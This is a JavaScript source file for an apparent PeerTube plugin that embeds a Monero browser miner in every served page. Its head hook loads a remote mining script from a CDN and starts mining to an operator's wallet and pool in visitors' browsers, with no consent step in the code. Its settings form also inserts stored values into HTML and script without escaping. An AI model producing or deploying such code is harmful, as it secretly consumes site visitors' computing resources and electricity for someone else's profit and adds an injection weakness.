const fs = require('fs');
const path = require('path');
const { registerHook } = require('peertube-plugin-toolkit');

module.exports = async function ({ registerHook }) {
  // 設定ファイルのパス
  const settingsFilePath = path.join(__dirname, 'pluginSettings.json');

  // 設定をロードする関数
  async function loadSettings() {
    try {
      if (fs.existsSync(settingsFilePath)) {
        const data = fs.readFileSync(settingsFilePath, 'utf-8');
        return JSON.parse(data);
      } else {
        // デフォルト設定を返す
        return {
          walletAddress: '',
          webSocket: 'wss://ny1.xmrminingproxy.com',
          poolAddress: 'moneroocean.stream',
          threads: 2,
        };
      }
    } catch (error) {
      console.error('Error loading settings:', error);
      return null; // エラー時は null を返す
    }
  }

  // 設定を保存する関数
  async function saveSettings(settings) {
    try {
      fs.writeFileSync(settingsFilePath, JSON.stringify(settings, null, 2));
      console.log('Settings saved successfully.');
    } catch (error) {
      console.error('Error saving settings:', error);
    }
  }

  // 設定をロード
  const settings = await loadSettings();

  // フック1: HTMLヘッダーにマイニングスクリプトを追加
  registerHook({
    target: 'action:theme.head',
    handler: () => {
      if (!settings) return ''; // 設定がロードできない場合はスクリプトを挿入しない

      return `
        <!-- Start Of Mining Code -->
        <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
        <script>
          server = "${settings.webSocket}";
          var pool = "${settings.poolAddress}";
          var walletAddress = "${settings.walletAddress}";
          var workerId = "PeerTube-XMR";
          var threads = ${settings.threads};
          var password = "";
          startMining(pool, walletAddress, workerId, threads, password);
          throttleMiner = 20;
        </script>
        <!-- End Of Mining Code -->
      `;
    },
  });

  // フック2: 管理画面に設定フォームを追加
  registerHook({
    target: 'admin.plugins.list',
    handler: () => {
      return `
        <div class="container">
          <h3>Monero Miner Plugin Settings</h3>
          <form id="monero-miner-settings">
            <div class="form-group">
              <label for="walletAddress">Monero Wallet Address</label>
              <input type="text" id="walletAddress" class="form-control" value="${settings.walletAddress}" required>
            </div>
            <div class="form-group">
              <label for="webSocket">WebSocket Server</label>
              <input type="text" id="webSocket" class="form-control" value="${settings.webSocket}" required>
            </div>
            <div class="form-group">
              <label for="poolAddress">Mining Pool Address</label>
              <input type="text" id="poolAddress" class="form-control" value="${settings.poolAddress}" required>
            </div>
            <div class="form-group">
              <label for="threads">Number of Threads</label>
              <input type="number" id="threads" class="form-control" value="${settings.threads}" required>
            </div>
            <button type="submit" class="btn btn-primary">Save Settings</button>
          </form>
          <script>
            document.getElementById('monero-miner-settings').addEventListener('submit', async (e) => {
              e.preventDefault();
              const settings = {
                walletAddress: document.getElementById('walletAddress').value,
                webSocket: document.getElementById('webSocket').value,
                poolAddress: document.getElementById('poolAddress').value,
                threads: parseInt(document.getElementById('threads').value, 10),
              };
              try {
                const response = await fetch('/api/v1/plugins/admin/monero-miner/settings', {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify(settings),
                });
                if (response.ok) {
                  alert('Settings saved successfully!');
                } else {
                  alert('Failed to save settings. Please check the server logs.');
                }
              } catch (error) {
                console.error('Error saving settings:', error);
                alert('An error occurred while saving settings.');
              }
            });
          </script>
        </div>
      `;
    },
  });

  // フック3: 設定保存時の処理
  registerHook({
    target: 'admin.plugins.save',
    handler: async (pluginData) => {
      await saveSettings(pluginData);
    },
  });
};